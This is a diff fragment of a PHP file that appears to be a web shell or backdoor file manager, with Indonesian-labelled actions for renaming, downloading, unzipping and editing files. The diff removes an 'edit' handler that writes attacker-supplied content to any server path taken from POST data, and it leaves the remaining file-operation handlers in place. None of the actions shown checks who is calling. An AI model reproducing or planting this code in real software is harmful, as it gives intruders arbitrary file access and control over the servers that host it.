@@ -473,22 +473,7 @@ if (isset($_GET['fileloc'])) {
     <input type="hidden" name="pilih" value="gantinama">
     <input type="submit" value="Change" name="gantin" class="button" style="cursor: pointer; border-color: #fff"/>
     </form>';
-} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
-    if (isset($_POST['gasedit'])) {
-        $edit = @file_put_contents($_POST['path'], $_POST['src']);
-        if ($edit == true) {
-            green("Edit File Success !");
-        } else {
-            red("Edit File Failed !");
-        }
-    }
-    echo "<center>".$_POST['path']."<br><br>";
-    echo '<form method="post">
-    <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br>
-    <input type="hidden" name="path" value="'.$_POST['path'].'">
-    <input type="hidden" name="pilih" value="edit">
-    <input type="submit" value="Edit File" name="gasedit" class="button" />
-    </form><br>';
+
 } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "dunlut") {
     dunlut($_POST['path']);
 } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "unzip") {
